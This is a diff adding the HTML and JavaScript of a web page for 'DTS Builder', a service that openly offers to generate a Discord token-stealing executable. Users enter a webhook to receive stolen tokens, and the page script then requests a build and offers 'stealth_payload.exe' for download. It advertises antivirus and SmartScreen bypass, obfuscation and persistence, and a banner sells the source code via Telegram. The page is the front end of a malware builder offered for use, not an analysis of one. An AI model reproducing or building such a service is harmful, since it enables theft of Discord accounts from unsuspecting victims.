@@ -1,0 +1,759 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <!-- Discord Embed Meta Tags -->
+    <meta property="og:title" content="DTS Builder - Discord Token Stealer Builder">
+    <meta property="og:description" content="Discord Token Stealer Builder with advanced token security">
+    <meta property="og:type" content="website">
+    <meta property="og:image" content="https://i.pinimg.com/736x/b3/07/17/b30717b9e7f8b5abffa42af49038ebd6.jpg">
+    <meta property="og:url" content="https://discord.com">
+    <meta name="theme-color" content="#8B5CF6">
+    
+    <title>DTS Builder - Secure Webhook Protection</title>
+    
+    <!-- Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com/">
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
+    <link href="DTS%20Builder%20-%20Secure%20Webhook%20Protection_files/css2.css" rel="stylesheet">
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --primary-purple: #8B5CF6;
+            --primary-purple-dark: #7C3AED;
+            --primary-purple-light: #A78BFA;
+            --accent-cyan: #06D6A0;
+            --accent-pink: #EF476F;
+            --accent-gold: #F59E0B;
+            --dark-bg: #0A0A0F;
+            --dark-card: #13131F;
+            --dark-card-hover: #1C1C2E;
+            --dark-border: #2A2A3E;
+            --text-primary: #F8FAFC;
+            --text-secondary: #94A3B8;
+            --gradient-start: #8B5CF6;
+            --gradient-middle: #06D6A0;
+            --gradient-end: #EF476F;
+            --shadow-glow: 0 0 20px rgba(139, 92, 246, 0.3);
+        }
+
+        /* Announcement Banner */
+        .announcement-banner {
+            background: linear-gradient(135deg, var(--accent-gold), #D97706);
+            color: #1f2937;
+            text-align: center;
+            padding: 1rem;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 4px 12px rgba(245, 158, 11, 0.3);
+            z-index: 1000;
+        }
+
+        .announcement-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 1rem;
+        }
+
+        .announcement-text {
+            font-weight: 600;
+            font-size: 1.1rem;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .announcement-badge {
+            background: rgba(255, 255, 255, 0.3);
+            padding: 0.3rem 0.8rem;
+            border-radius: 20px;
+            font-size: 0.9rem;
+            font-weight: 500;
+        }
+
+        .cta-button {
+            background: rgba(0, 0, 0, 0.2);
+            color: #1f2937;
+            border: 2px solid rgba(31, 41, 55, 0.3);
+            padding: 0.6rem 1.5rem;
+            border-radius: 30px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-decoration: none;
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .cta-button:hover {
+            background: rgba(0, 0, 0, 0.3);
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+        }
+
+        .pulse-dot {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            background: #1f2937;
+            border-radius: 50%;
+            margin-right: 8px;
+            animation: pulse 1.5s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.2); opacity: 0.7; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: linear-gradient(135deg, var(--dark-bg) 0%, #000000 100%);
+            color: var(--text-primary);
+            min-height: 100vh;
+            line-height: 1.6;
+            overflow-x: hidden;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 2rem;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 3rem;
+            position: relative;
+        }
+
+        .logo {
+            font-size: 3.5rem;
+            font-weight: 800;
+            background: linear-gradient(135deg, var(--gradient-start), var(--gradient-middle), var(--gradient-end));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 0.5rem;
+            letter-spacing: -1px;
+            position: relative;
+            display: inline-block;
+        }
+
+        .logo::after {
+            content: '';
+            position: absolute;
+            width: 100%;
+            height: 4px;
+            bottom: -5px;
+            left: 0;
+            background: linear-gradient(90deg, var(--gradient-start), var(--gradient-middle), var(--gradient-end));
+            border-radius: 2px;
+            transform: scaleX(0);
+            transform-origin: left;
+            transition: transform 0.3s ease;
+        }
+
+        .logo:hover::after {
+            transform: scaleX(1);
+        }
+
+        .tagline {
+            color: var(--text-secondary);
+            font-size: 1.3rem;
+            font-weight: 400;
+            max-width: 600px;
+            margin: 0 auto;
+            line-height: 1.5;
+        }
+
+        .main-content {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 2.5rem;
+        }
+
+        @media (min-width: 768px) {
+            .main-content {
+                grid-template-columns: 1fr 1fr;
+            }
+            
+            .announcement-content {
+                flex-wrap: nowrap;
+            }
+        }
+
+        .card {
+            background: var(--dark-card);
+            border: 1px solid var(--dark-border);
+            border-radius: 20px;
+            padding: 2.5rem;
+            backdrop-filter: blur(10px);
+            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, rgba(139, 92, 246, 0.1) 0%, rgba(6, 214, 160, 0.05) 100%);
+            opacity: 0;
+            transition: opacity 0.4s ease;
+            z-index: 0;
+        }
+
+        .card:hover {
+            transform: translateY(-8px);
+            box-shadow: var(--shadow-glow);
+            border-color: rgba(139, 92, 246, 0.5);
+        }
+
+        .card:hover::before {
+            opacity: 1;
+        }
+
+        .card-content {
+            position: relative;
+            z-index: 1;
+        }
+
+        .card-title {
+            font-size: 1.8rem;
+            font-weight: 700;
+            margin-bottom: 1.2rem;
+            color: var(--text-primary);
+            background: linear-gradient(135deg, var(--primary-purple), var(--accent-cyan));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .form-group {
+            margin-bottom: 1.8rem;
+            position: relative;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 0.7rem;
+            color: var(--text-secondary);
+            font-weight: 500;
+            font-size: 1rem;
+        }
+
+        input[type="url"] {
+            width: 100%;
+            padding: 1.2rem 1.5rem;
+            background: rgba(15, 15, 25, 0.7);
+            border: 1px solid var(--dark-border);
+            border-radius: 12px;
+            color: var(--text-primary);
+            font-size: 1rem;
+            transition: all 0.3s ease;
+            font-family: 'JetBrains Mono', monospace;
+        }
+
+        input[type="url"]:focus {
+            outline: none;
+            border-color: var(--primary-purple);
+            box-shadow: 0 0 0 3px rgba(139, 92, 246, 0.2);
+            background: rgba(15, 15, 25, 0.9);
+        }
+
+        input[type="url"]::placeholder {
+            color: var(--text-secondary);
+            opacity: 0.7;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 1.3rem 2rem;
+            background: linear-gradient(135deg, var(--primary-purple), var(--primary-purple-dark));
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            position: relative;
+            overflow: hidden;
+            z-index: 1;
+        }
+
+        .btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            transition: left 0.7s ease;
+            z-index: -1;
+        }
+
+        .btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 30px rgba(139, 92, 246, 0.4);
+        }
+
+        .btn:hover::before {
+            left: 100%;
+        }
+
+        .btn:disabled {
+            background: var(--text-secondary);
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+
+        .btn:disabled:hover::before {
+            left: -100%;
+        }
+
+        .status-card {
+            text-align: center;
+        }
+
+        .progress-container {
+            width: 100%;
+            height: 10px;
+            background: rgba(255, 255, 255, 0.08);
+            border-radius: 5px;
+            overflow: hidden;
+            margin: 2rem 0;
+            position: relative;
+        }
+
+        .progress-bar {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, var(--primary-purple), var(--accent-cyan));
+            border-radius: 5px;
+            transition: width 0.5s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .progress-bar::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.4), transparent);
+            animation: shimmer 2s infinite;
+        }
+
+        @keyframes shimmer {
+            0% { left: -100%; }
+            100% { left: 100%; }
+        }
+
+        .status-message {
+            font-size: 1.2rem;
+            margin-bottom: 1.5rem;
+            color: var(--text-secondary);
+            min-height: 2.5rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .download-btn {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            padding: 1.3rem 2.5rem;
+            background: linear-gradient(135deg, var(--accent-cyan), #05B384);
+            color: white;
+            text-decoration: none;
+            border-radius: 12px;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+            z-index: 1;
+        }
+
+        .download-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            transition: left 0.7s ease;
+            z-index: -1;
+        }
+
+        .download-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 30px rgba(6, 214, 160, 0.4);
+        }
+
+        .download-btn:hover::before {
+            left: 100%;
+        }
+
+        .error-message {
+            color: var(--accent-pink);
+            background: rgba(239, 71, 111, 0.1);
+            padding: 1.2rem;
+            border-radius: 12px;
+            border-left: 4px solid var(--accent-pink);
+            margin-top: 1.5rem;
+            font-weight: 500;
+        }
+
+        .feature-list {
+            list-style: none;
+            margin-top: 1.5rem;
+        }
+
+        .feature-list li {
+            padding: 0.8rem 0;
+            color: var(--text-secondary);
+            display: flex;
+            align-items: center;
+            transition: color 0.3s ease;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        .feature-list li:last-child {
+            border-bottom: none;
+        }
+
+        .feature-list li:hover {
+            color: var(--text-primary);
+        }
+
+        .feature-list li::before {
+            content: "✓";
+            color: var(--accent-cyan);
+            font-weight: bold;
+            margin-right: 0.8rem;
+            font-size: 1.2rem;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 4rem;
+            padding: 2.5rem 0;
+            color: var(--text-secondary);
+            border-top: 1px solid var(--dark-border);
+            position: relative;
+        }
+
+        .footer::before {
+            content: '';
+            position: absolute;
+            top: -1px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 100px;
+            height: 3px;
+            background: linear-gradient(90deg, var(--primary-purple), var(--accent-cyan));
+            border-radius: 0 0 3px 3px;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        .pulse {
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.7; }
+            100% { opacity: 1; }
+        }
+
+        .security-badge {
+            display: inline-flex;
+            align-items: center;
+            padding: 0.7rem 1.5rem;
+            background: rgba(139, 92, 246, 0.15);
+            color: var(--primary-purple-light);
+            border-radius: 30px;
+            font-size: 0.95rem;
+            font-weight: 600;
+            margin-top: 1.5rem;
+            border: 1px solid rgba(139, 92, 246, 0.3);
+            transition: all 0.3s ease;
+        }
+
+        .security-badge:hover {
+            background: rgba(139, 92, 246, 0.25);
+            transform: scale(1.05);
+        }
+
+        .floating-elements {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            top: 0;
+            left: 0;
+            pointer-events: none;
+            z-index: 0;
+            overflow: hidden;
+        }
+
+        .floating-element {
+            position: absolute;
+            background: rgba(139, 92, 246, 0.1);
+            border-radius: 50%;
+            animation: float 15s infinite linear;
+        }
+
+        @keyframes float {
+            0% { transform: translateY(0) rotate(0deg); }
+            100% { transform: translateY(-1000px) rotate(720deg); }
+        }
+
+        .feature-icon {
+            margin-right: 10px;
+            font-size: 1.2rem;
+        }
+
+        .glow-text {
+            text-shadow: 0 0 10px rgba(139, 92, 246, 0.5);
+        }
+    </style>
+</head>
+<body>
+    <!-- Announcement Banner -->
+    <div class="announcement-banner">
+        <div class="announcement-content">
+            <div class="announcement-text">
+                <span class="pulse-dot"></span>
+                <span>SOURCE CODE NOW AVAILABLE FOR SALE</span>
+                <span class="announcement-badge">LIMITED TIME OFFER</span>
+            </div>
+			<a href="https://t.me/codingguyy" target="_blank" class="cta-button">
+				<span>TELEGRAM</span>
+				<span>→</span>
+			</a>
+        </div>
+    </div>
+
+    <div class="floating-elements">
+        <div class="floating-element" style="width: 100px; height: 100px; top: 10%; left: 5%; animation-delay: 0s;"></div>
+        <div class="floating-element" style="width: 150px; height: 150px; top: 60%; left: 80%; animation-delay: -5s;"></div>
+        <div class="floating-element" style="width: 80px; height: 80px; top: 30%; left: 70%; animation-delay: -10s;"></div>
+    </div>
+
+    <div class="container">
+        <header class="header">
+            <h1 class="logo">DTS BUILDER</h1>
+            <p class="tagline">Advanced Discord Token Security with Military-Grade Protection</p>
+        </header>
+
+        <main class="main-content">
+            <div class="card">
+                <div class="card-content">
+                    <h2 class="card-title">Build Your Secure Token Grabber</h2>
+                    <p style="color: var(--text-secondary); margin-bottom: 1.8rem; line-height: 1.6;">
+                        Enter your Discord webhook URL to generate an undetectable, fully protected payload
+                    </p>
+                    
+                    <form id="buildForm">
+                        <div class="form-group">
+                            <label for="webhookUrl">Discord Webhook URL:</label>
+                            <input type="url" id="webhookUrl" name="webhookUrl" required="" placeholder="https://discord.com/api/webhooks/..." autocomplete="off">
+                        </div>
+                        
+                        <button type="submit" id="buildBtn" class="btn">
+                            <span id="btnText">Build Protected Version</span>
+                        </button>
+                    </form>
+
+                    <div class="security-badge">
+                        <span class="feature-icon">🔒</span> End-to-End Encryption &amp; Stealth Technology
+                    </div>
+                </div>
+            </div>
+
+            <div class="card status-card">
+                <div class="card-content">
+                    <h2 class="card-title">Build Status</h2>
+                    
+                    <div id="status" class="hidden">
+                        <div class="progress-container">
+                            <div class="progress-bar" id="progressBar"></div>
+                        </div>
+                        <div class="status-message" id="statusMessage">Initializing secure build process...</div>
+                    </div>
+
+                    <div id="downloadSection" class="hidden">
+                        <div class="status-message">✅ Build completed successfully!</div>
+                        <p style="color: var(--text-secondary); margin: 1.5rem 0; line-height: 1.6;">
+                            Your stealth payload is ready for deployment
+                        </p>
+                        <a id="downloadLink" class="download-btn" href="#" download="stealth_payload.exe">
+                            <span class="feature-icon">📦</span> Download Secure Build
+                        </a>
+                    </div>
+
+                    <div id="errorSection" class="hidden">
+                        <div class="error-message" id="errorMessage"></div>
+                    </div>
+
+                    <div id="features">
+                        <h3 style="margin: 1.8rem 0 1.2rem 0; color: var(--text-primary);">Advanced Features:</h3>
+                        <ul class="feature-list">
+                            <li>Military-grade webhook protection</li>
+                            <li>Advanced anti-detection mechanisms</li>
+                            <li>Reverser-safe code obfuscation</li>
+                            <li>SmartScreen &amp; antivirus bypass</li>
+                            <li>Stealth execution &amp; persistence</li>
+                            <li>Real-time token validation</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </main>
+
+        <footer class="footer">
+            <p>© 2025 DTS Builder • Elite Webhook Protection System</p>
+            <p style="margin-top: 0.8rem; font-size: 0.95rem; opacity: 0.8;">
+                Built with cutting-edge security protocols and military-grade encryption standards
+            </p>
+        </footer>
+    </div>
+
+    <script>
+        document.getElementById('buildForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const webhookUrl = document.getElementById('webhookUrl').value;
+            const buildBtn = document.getElementById('buildBtn');
+            const btnText = document.getElementById('btnText');
+            const statusSection = document.getElementById('status');
+            const statusMessage = document.getElementById('statusMessage');
+            const progressBar = document.getElementById('progressBar');
+            const downloadSection = document.getElementById('downloadSection');
+            const downloadLink = document.getElementById('downloadLink');
+            const errorSection = document.getElementById('errorSection');
+            const errorMessage = document.getElementById('errorMessage');
+            const features = document.getElementById('features');
+            
+            // Reset UI
+            buildBtn.disabled = true;
+            btnText.textContent = 'Building...';
+            statusSection.classList.remove('hidden');
+            downloadSection.classList.add('hidden');
+            errorSection.classList.add('hidden');
+            features.classList.add('hidden');
+            progressBar.style.width = '0%';
+            
+            try {
+               
+                updateStatus('Requesting token protection...', 20);
+                const response = await fetch('/build/protect', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ webhookUrl })
+                });
+                
+                const data = await response.json();
+                
+                if (!response.ok) {
+                    throw new Error(data.error || 'Protection request failed');
+                }
+                
+                
+                updateStatus('Building project...', 40);
+                const buildResponse = await fetch('/build/start', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ protectedUrl: data.protectedUrl })
+                });
+                
+                const buildData = await buildResponse.json();
+                
+                if (!buildResponse.ok) {
+                    throw new Error(buildData.error || 'Build process failed');
+                }
+                
+              
+                updateStatus('Compiling code...', 60);
+                features.classList.remove('hidden');
+                
+              
+                const pollBuild = async (buildId) => {
+                    const statusResponse = await fetch(`/build/status/${buildId}`);
+                    const statusData = await statusResponse.json();
+                    
+                    if (statusData.status === 'completed') {
+                        updateStatus('Packaging files...', 80);
+                    
+                        setTimeout(() => {
+                            updateStatus('Build complete!', 100);
+                            downloadLink.href = `/build/download/${buildId}`;
+                            downloadSection.classList.remove('hidden');
+                            buildBtn.disabled = false;
+                            btnText.textContent = 'Build Another';
+                        }, 1500);
+                        
+                    } else if (statusData.status === 'error') {
+                        throw new Error(statusData.error || 'Build error');
+                    } else {
+                     
+                        setTimeout(() => pollBuild(buildId), 2000);
+                    }
+                };
+                
+                await pollBuild(buildData.buildId);
+                
+            } catch (error) {
+                showError(error.message);
+                buildBtn.disabled = false;
+                btnText.textContent = 'Build Protected Version';
+            }
+        });
+
+        function updateStatus(message, progress) {
+            document.getElementById('statusMessage').textContent = message;
+            document.getElementById('progressBar').style.width = `${progress}%`;
+        }
+
+        function showError(message) {
+            document.getElementById('errorMessage').textContent = message;
+            document.getElementById('errorSection').classList.remove('hidden');
+        }
+    </script>
+<script defer="defer" src="DTS%20Builder%20-%20Secure%20Webhook%20Protection_files/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon="{&quot;version&quot;:&quot;2024.11.0&quot;,&quot;token&quot;:&quot;bf74d86ef4284d7c8d3aac5d178aa6a1&quot;,&quot;r&quot;:1,&quot;server_timing&quot;:{&quot;name&quot;:{&quot;cfCacheStatus&quot;:true,&quot;cfEdge&quot;:true,&quot;cfExtPri&quot;:true,&quot;cfL4&quot;:true,&quot;cfOrigin&quot;:true,&quot;cfSpeedBrain&quot;:true},&quot;location_startswith&quot;:null}}" crossorigin="anonymous"></script>
+
+</body></html>
